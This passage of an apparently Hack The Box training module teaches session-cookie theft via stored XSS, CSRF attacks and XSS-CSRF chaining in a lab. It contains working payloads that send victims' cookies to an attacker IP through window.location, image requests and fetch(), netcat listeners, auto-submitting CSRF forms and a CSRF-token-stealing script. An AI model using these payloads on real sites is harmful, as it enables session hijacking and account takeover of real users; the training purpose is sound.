+<p>The cookie-logging script can be run as follows. <code>TUN Adapter IP</code> is the <code>tun</code> interface's IP of either Pwnbox or your own VM.</p>
+<p>Cross-Site Scripting (XSS)</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ php -S &lt;VPN/</span>TUN Adapter IP&gt;:<span class="hljs-number">8000</span>
+[Mon Mar  <span class="hljs-number">7</span> <span class="hljs-number">10</span>:<span class="hljs-number">54</span>:<span class="hljs-number">04</span> <span class="hljs-number">2022</span>] PHP <span class="hljs-number">7.4</span><span class="hljs-number">.21</span> Development Server (<span class="hljs-string">http:</span><span class="hljs-comment">//&lt;VPN/TUN Adapter IP&gt;:8000) started</span>
+</code></pre>
+<p>Before we simulate the attack, let us restore Ela Stienen's original Email and Telephone (since we found no XSS in these fields and also want the profile to look legitimate). Now, let us place the below payload in the <em>Country</em> field. There are no specific requirements for the payload; we just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.</p>
+<p>Payload:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">@<span class="hljs-keyword">keyframes</span> x{}</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"animation-name:x"</span> <span class="hljs-attr">onanimationend</span>=<span class="hljs-string">"window.location = 'http://&lt;VPN/TUN Adapter IP&gt;:8000/log.php?c=' + document.cookie;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span>
+</code></pre>
+<p><strong>Note</strong>: If you're doing testing in the real world, try using something like <a href="https://xsshunter.com/">XSSHunter</a>, <a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a> or <a href="https://app.interactsh.com/">Project Interactsh</a>. A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.</p>
+<p>A sample HTTPS&gt;HTTPS payload example can be found below:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">'document.write(`&lt;img src="https://CUSTOMLINK?cookie=$</span></span></span><span class="hljs-template-variable">{btoa(document.cookie)}</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">"&gt;`)'</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>
+</code></pre>
+<p><strong>Simulate the victim</strong></p>
+<p>Open a <code>New Private Window</code>, navigate to <code>http://xss.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: smallfrog576</li>
+<li>Password: guitars</li>
+</ul>
+<p>This account will play the role of the victim!</p>
+<p>Now, navigate to <code>http://xss.htb.net/profile?email=ela.stienen@example.com</code>. This is the attacker-crafted public profile that hosts our cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).</p>
+<p>You should now see the below in your attacking machine.</p>
+<p><img src="storage\modules\153\52.png" alt="image"></p>
+<p>Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside <code>cookieLog.txt</code></p>
+<p><img src="storage\modules\153\53.png" alt="image"></p>
+<p>You can now use this stolen cookie to hijack the victim's session!</p>
+<hr>
+<h3 id="obtaining-session-cookies-via-xss-netcat-edition-">Obtaining session cookies via XSS (Netcat edition)</h3>
+<p>Instead of a cookie-logging script, we could have also used the venerable Netcat tool.</p>
+<p>Let us try that as well for completeness's sake.</p>
+<p>Before we simulate the attack, let us place the below payload in the <em>Country</em> field of Ela Stienen's profile and click "Save." There are no specific requirements for the payload. We just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">'document.write(`&lt;img src="http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=$</span></span></span><span class="hljs-template-variable">{btoa(document.cookie)}</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">"&gt;`)'</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>
+</code></pre>
+<p>Let us also instruct Netcat to listen on port 8000 as follows.</p>
+<p>Cross-Site Scripting (XSS)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">8000</span>
+listening on [any] <span class="hljs-number">8000</span> ...
+</code></pre>
+<p>Open a <code>New Private Window</code> and navigate to <code>http://xss.htb.net/profile?email=ela.stienen@example.com</code>, simulating what the victim would do. We remind you that the above is an attacker-controlled public profile hosting a cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).</p>
+<p>By the time you hold your mouse over "test," you should now see the below in your attacking machine.</p>
+<p><img src="storage\modules\153\54.png" alt="image"></p>
+<p>Please note that the cookie is a Base64 value because we used the <code>btoa()</code> function, which will base64 encode the cookie's value. We can decode it using <code>atob("b64_string")</code> in the Dev Console of Web Developer Tools, as follows.</p>
+<p><img src="storage\modules\153\55.png" alt="image"></p>
+<p>You can now use this stolen cookie to hijack the victim's session!</p>
+<p>We don't necessarily have to use the <code>window.location()</code> object that causes victims to get redirected. We can use <code>fetch()</code>, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.</p>
+<p>Find an example of such a payload below.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">fetch(<span class="hljs-string">`http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=<span class="hljs-subst">${btoa(<span class="hljs-built_in">document</span>.cookie)}</span>`</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<h2 id="cross-site-request-forgery-csrf-or-xsrf-">Cross-Site Request Forgery (CSRF or XSRF)</h2>
+<hr>
+<p>Cross-site requests are common in web applications and are used for multiple legitimate purposes.</p>
+<p>Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with, leveraging the lack of anti-CSRF security mechanisms. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf. CSRF attacks generally target functions that cause a state change on the server but can also be used to access sensitive data.</p>
+<p>A successful CSRF attack can compromise end-user data and operations when it targets a regular user. If the targeted end-user is an administrative one, a CSRF attack can compromise the entire web application.</p>
+<p>During CSRF attacks, the attacker does not need to read the server's response to the malicious cross-site request. This means that <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy">Same-Origin Policy</a> cannot be considered a security mechanism against CSRF attacks.</p>
+<p><strong>Reminder</strong>: According to Mozilla, the same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin. The same-origin policy will not allow an attacker to read the server's response to a malicious cross-site request.</p>
+<p>A web application is vulnerable to CSRF attacks when:</p>
+<ul>
+<li>All the parameters required for the targeted request can be determined or guessed by the attacker</li>
+<li>The application's session management is solely based on HTTP cookies, which are automatically included in browser requests</li>
+</ul>
+<p>To successfully exploit a CSRF vulnerability, we need:</p>
+<ul>
+<li>To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim</li>
+<li>The victim to be logged into the application at the time when the malicious cross-site request is issued</li>
+</ul>
+<p>In your web application penetration testing or bug bounty hunting endeavors, you will notice a lot of applications that feature no anti-CSRF protections or anti-CSRF protections that can be easily bypassed.</p>
+<p>We will focus on evading anti-CSRF protections in the following sections.</p>
+<hr>
+<h3 id="cross-site-request-forgery-example">Cross-Site Request Forgery Example</h3>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code>. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>xss.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>http://xss.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: crazygorilla983</li>
+<li>Password: pisces</li>
+</ul>
+<p>This is an account that we created to look at the functionality of the application.</p>
+<p>Run Burp Suite as follows.</p>
+<p>Cross-Site Request Forgery (CSRF or XSRF)</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ burpsuite
+</code></pre>
+<p>Activate burp suite's proxy (<em>Intercept On</em>) and configure your browser to go through it.</p>
+<p>Now, click on "Save."</p>
+<p>You should see the below.</p>
+<p><img src="storage\modules\153\28.png" alt="image"></p>
+<p>We notice no anti-CSRF token in the update-profile request. Let's try executing a CSRF attack against our account (Ela Stienen) that will change her profile details by simply visiting another website (while logged in to the target application).</p>
+<p>First, create and serve the below HTML page. Save it as <code>notmalicious.html</code></p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"submitMe"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://xss.htb.net/api/update-profile"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker@htb.net"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"telephone"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"&amp;#40;227&amp;#41;&amp;#45;750&amp;#45;8112"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"country"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"CSRF_POC"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+      <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"submitMe"</span>).submit()
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>If you are wondering how we ended up with the above form, please see the image below. <img src="storage\modules\153\29.png" alt="image"></p>
+<p>We can serve the page above from our attacking machine as follows.</p>
+<p>Cross-Site Request Forgery (CSRF or XSRF)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python -m http.server <span class="hljs-number">1337</span>
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">1337</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">1337</span>/) ...
+</code></pre>
+<p>No need for a proxy at this time, so don't make your browser go through Burp Suite. Restore the browser's original proxy settings.</p>
+<p>While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine <code>http://&lt;VPN/TUN Adapter IP&gt;:1337/notmalicious.html</code>. You will notice that Ela Stienen's profile details will change to the ones we specified in the HTML page we are serving.</p>
+<p><img src="storage\modules\153\30.png" alt="image"></p>
+<p>Our assumption that there is no CSRF protection in the application was correct. We were able to change Ela Stienen's profile details via a cross-site request.</p>
+<h2 id="cross-site-request-forgery-get-based-">Cross-Site Request Forgery (GET-based)</h2>
+<hr>
+<p>Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.</p>
+<p>Let us see an example.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon, then use the provided Pwnbox or a local VM with the supplied VPN key to be able to reach the target application and follow along. Then, configure the specified vhost (<code>csrf.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>http://csrf.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: heavycat106</li>
+<li>Password: rocknrol</li>
+</ul>
+<p>This is an account that we created to look at the application's functionality.</p>
+<p>Now, browse Julie Rogers' profile and click <em>Save</em>. You should see the below. <img src="storage\modules\153\32.png" alt="image"></p>
+<p>Activate burp suite's proxy (<em>Intercept On</em>) and configure your browser to go through it. Now click <em>Save</em> again.</p>
+<p>You should see the below.</p>
+<p><img src="storage\modules\153\31.png" alt="image"></p>
+<p>The CSRF token is included in the GET request.</p>
+<p>Let us simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack. Of course, they could have just performed a session hijacking attack using the sniffed session cookie.</p>
+<p>First, create and serve the below HTML page. Save it as <code>notmalicious_get.html</code></p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"submitMe"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://csrf.htb.net/app/save/julie.rogers@example.com"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker@htb.net"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"telephone"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"&amp;#40;227&amp;#41;&amp;#45;750&amp;#45;8112"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"country"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"CSRF_POC"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"action"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"save"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"30e7912d04c957022a6d3072be8ef67e52eda8f2"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+      <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"submitMe"</span>).submit()
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p>Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.</p>
+<p>If you are wondering how we came up with the above form based on the intercepted GET request, please study the following resource <a href="https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending\_and\_retrieving\_form\_data">Sending form data</a></p>
+<p>You can serve the page above from your attacking machine as follows.</p>
+<p>Cross-Site Request Forgery (GET-based)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python -m http.server <span class="hljs-number">1337</span>
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">1337</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">1337</span>/) ...
+</code></pre>
+<p>While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine <code>http://&lt;VPN/TUN Adapter IP&gt;:1337/notmalicious_get.html</code>. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.</p>
+<p><img src="storage\modules\153\34.png" alt="image"></p>
+<p>In the next section, we will attack an application submitting the CSRF token via POST without having to reside in the local network.</p>
+<h2 id="cross-site-request-forgery-post-based-">Cross-Site Request Forgery (POST-based)</h2>
+<hr>
+<p>The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>csrf.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>http://csrf.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: heavycat106</li>
+<li>Password: rocknrol</li>
+</ul>
+<p>This is an account that we created to look at the application's functionality.</p>
+<p>After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.</p>
+<p>Click on the "Delete" button. You will get redirected to <code>/app/delete/&lt;your-email&gt;</code></p>
+<p><img src="storage\modules\153\36.png" alt="image"></p>
+<p>Notice that the email is reflected on the page. Let us try inputting some HTML into the <em>email</em> value, such as:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>h1<span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span>underline<span class="hljs-tag">&lt;<span class="hljs-name">%2fu</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">%2fh1</span>&gt;</span>
+</code></pre>
+<p><img src="storage\modules\153\37.png" alt="image"></p>
+<p>If you inspect the source (<code>Ctrl+U</code>), you will notice that our injection happens before a <code>single quote</code>. We can abuse this to leak the CSRF-Token.</p>
+<p><img src="storage\modules\153\39.png" alt="image"></p>
+<p>Let us first instruct Netcat to listen on port 8000, as follows.</p>
+<p>Cross-Site Request Forgery (POST-based)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">8000</span>
+listening on [any] <span class="hljs-number">8000</span> ...
+</code></pre>
+<p>Now we can get the CSRF token via sending the below payload to our victim.</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;<span class="hljs-keyword">table</span>%20background='%2f%2f&lt;VPN/TUN <span class="hljs-comment">Adapter IP&gt;:PORT%2f</span>
+</code></pre>
+<p>While still logged in as Julie Rogers, open a new tab and visit <code>http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code>. You will notice a connection being made that leaks the CSRF token.</p>
+<p><img src="storage\modules\153\40.png" alt="image"></p>
+<p>Since the attack was successful against our test account, we can do the same against any account of our choosing.</p>
+<p>We remind you that this attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!</p>
+<p>Next, we will cover how you can chain XSS and CSRF to attack a user's session.</p>
+<h2 id="xss-csrf-chaining">XSS &amp; CSRF Chaining</h2>
+<hr>
+<p>Sometimes, even if we manage to bypass CSRF protections, we may not be able to create cross-site requests due to some sort of same origin/same site restriction. If this is the case, we can try chaining vulnerabilities to get the end result of CSRF.</p>
+<p>Let us provide you with a practical example.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>minilab.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>http://minilab.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: crazygorilla983</li>
+<li>Password: pisces</li>
+</ul>
+<p>This is an account that we created to look at the application's functionality.</p>
+<p>Some facts about the application:</p>
+<ul>
+<li>The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it)</li>
+<li>The application's <em>Country</em> field is vulnerable to stored XSS attacks (like we saw in the <em>Cross-Site Scripting (XSS)</em> section)</li>
+</ul>
+<p>Malicious cross-site requests are out of the equation due to the same origin/same site protections. We can still perform a CSRF attack through the stored XSS vulnerability that exists. Specifically, we will leverage the stored XSS vulnerability to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain!</p>
+<p>Now it is time to develop the appropriate JavaScript payload to place within the <em>Country</em> field of Ela Stienen's profile.</p>
+<p>Let us target the <em>Change Visibility</em> request because a successful CSRF attack targeting <em>Change Visibility</em> can cause the disclosure of a private profile.</p>
+<p>First, we need to intercept the related request.</p>
+<p>Run Burp Suite as follows.</p>
+<p>XSS &amp; CSRF Chaining</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ burpsuite
+</code></pre>
+<p>By browsing the application, we notice that Ela Stienen can't share her profile. This is because her profile is <em>private</em>. Let us change that by clicking "Change Visibility."</p>
+<p>Then, activate Burp Suite's proxy (<em>Intercept On</em>) and configure your browser to go through it. Now click <em>Make Public!</em>.</p>
+<p><img src="storage\modules\153\45.png" alt="image"></p>
+<p>You should see the below inside Burp Suite's proxy.</p>
+<p><img src="storage\modules\153\56.png" alt="image"></p>
+<p>Forward all requests so that Ela Stienen's profile becomes public.</p>
+<p>Let us focus on the payload we should specify in the <em>Country</em> field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings (From private to public and vice versa).</p>
+<p>The payload we should specify can be seen below.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
+<span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest();
+req.onload = handleResponse;
+req.open(<span class="hljs-string">'get'</span>,<span class="hljs-string">'/app/change-visibility'</span>,<span class="hljs-literal">true</span>);
+req.send();
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleResponse</span><span class="hljs-params">(d)</span> </span>{
+    <span class="hljs-keyword">var</span> token = <span class="hljs-keyword">this</span>.responseText.match(/name=<span class="hljs-string">"csrf"</span> type=<span class="hljs-string">"hidden"</span> value=<span class="hljs-string">"(\w+)"</span>/)[<span class="hljs-number">1</span>];
+    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    changeReq.open(<span class="hljs-string">'post'</span>, <span class="hljs-string">'/app/change-visibility'</span>, <span class="hljs-literal">true</span>);
+    changeReq.setRequestHeader(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'application/x-www-form-urlencoded'</span>);
+    changeReq.send(<span class="hljs-string">'csrf='</span>+token+<span class="hljs-string">'&amp;action=change'</span>);
+};
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>Let us break things down for you.</p>
+<p>Firstly we put the entire script in <code>&lt;script&gt;</code> tags, so it gets executed as valid JavaScript; otherwise, it will be rendered as text.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-type">XMLHttpRequest</span>();
+req.onload = handleResponse;
+req.open(<span class="hljs-string">'get'</span>,<span class="hljs-string">'/app/change-visibility'</span>,<span class="hljs-literal">true</span>);
+req.send();
+</code></pre>
+<p>The script snippet above creates an ObjectVariable called <em>req</em>, which we will be using to generate a request. <em>var req = new XMLHttpRequest();</em> is allowing us to get ready to send HTTP requests.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">req.onload = handleResponse<span class="hljs-comment">;</span>
+</code></pre>
+<p>In the script snippet above, we see the <em>onload</em> event handler, which will perform an action once the page has been loaded. This action will be related to the <em>handleResponse</em> function that we will define later.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">req.<span class="hljs-keyword">open</span>(<span class="hljs-string">'get'</span>,<span class="hljs-string">'/app/change-visibility'</span>,<span class="hljs-literal">true</span>);
+</code></pre>
+<p>In the script snippet above, we pass three arguments. <em>get</em> which is the request method, the targeted path <em>/app/change-visibility</em> and then <em>true</em> which will continue the execution.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">req.send()<span class="hljs-comment">;</span>
+</code></pre>
+<p>The script snippet above will send everything we constructed in the HTTP request.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleResponse</span><span class="hljs-params">(d)</span> </span>{
+    <span class="hljs-keyword">var</span> token = <span class="hljs-keyword">this</span>.responseText.match(/name=<span class="hljs-string">"csrf"</span> type=<span class="hljs-string">"hidden"</span> value=<span class="hljs-string">"(\w+)"</span>/)[<span class="hljs-number">1</span>];
+    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    changeReq.open(<span class="hljs-string">'post'</span>, <span class="hljs-string">'/app/change-visibility'</span>, <span class="hljs-literal">true</span>);
+    changeReq.setRequestHeader(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'application/x-www-form-urlencoded'</span>);
+    changeReq.send(<span class="hljs-string">'csrf='</span>+token+<span class="hljs-string">'&amp;action=change'</span>);
+};
+</code></pre>
+<p>The script snippet above defines a function called <em>handleResponse</em>.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> token = <span class="hljs-keyword">this</span>.responseText.<span class="hljs-keyword">match</span>(/name=<span class="hljs-string">"csrf"</span> <span class="hljs-class"><span class="hljs-keyword">type</span></span>=<span class="hljs-string">"hidden"</span> value=<span class="hljs-string">"(\w+)"</span>/)[<span class="hljs-number">1</span>];
+</code></pre>
+<p>The script snippet above defines a variable called <em>token</em>, which gets the value of <em>responseText</em> from the page we specified earlier in our request. <code>/name="csrf" type="hidden" value="(\w+)"/)[1];</code> looks for a hidden input field called <em>csrf</em> and \w+ matches one or more alphanumeric characters. In some cases, this may be different, so let us look at how you can identify the name of a hidden value or check if it is actually "CSRF".</p>
+<p>Open Web Developer Tools (Shift+Ctrl+I in the case of Firefox) and navigate to the <em>Inspector</em> tab. We can use the <em>search</em> functionality to look for a specific string. In our case, we look for <em>csrf</em>, and we get a result.</p>
+<p><img src="storage\modules\153\57.png" alt="image"></p>
+<p><strong>Note</strong>: If no result is returned and you are certain that CSRF tokens are in place, look through various bits of the source code or copy your current CSRF token and look for it through the search functionality. This way, you may uncover the input field name you are looking for. If you still get no results, this doesn't mean that the application employs no anti-CSRF protections. There could be another form that is protected by an anti-CSRF protection.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> <span class="hljs-type">XMLHttpRequest</span>();
+    changeReq.open(<span class="hljs-string">'post'</span>, <span class="hljs-string">'/app/change-visibility'</span>, <span class="hljs-literal">true</span>);
+    changeReq.setRequestHeader(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'application/x-www-form-urlencoded'</span>);
+    changeReq.send(<span class="hljs-string">'csrf='</span>+token+<span class="hljs-string">'&amp;action=change'</span>);
+</code></pre>
+<p>The script snippet above constructs the HTTP request that we will send through a <a href="https://blog.0daylabs.com/2014/09/13/ajax-everything-you-should-know-about-xmlhttprequest/">XMLHttpRequest</a> object.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">changeReq.<span class="hljs-keyword">open</span>(<span class="hljs-string">'post'</span>, <span class="hljs-string">'/app/change-visibility'</span>, <span class="hljs-literal">true</span>);
+</code></pre>
+<p>In the script snippet above, we change the method from GET to POST. The first request was to move us to the targeted page and the second request was to perform the wanted action.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">changeReq.setRequestHeader(<span class="hljs-symbol">'Content</span>-<span class="hljs-keyword">Type</span>', <span class="hljs-symbol">'application</span>/x-www-form-urlencoded');
+</code></pre>
+<p>The script snippet above is setting the Content-Type to <em>application/x-www-form-urlencoded</em>.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">changeReq.<span class="hljs-built_in">send</span>(<span class="hljs-string">'csrf='</span>+token+<span class="hljs-string">'&amp;action=change'</span>)<span class="hljs-comment">;</span>
+</code></pre>
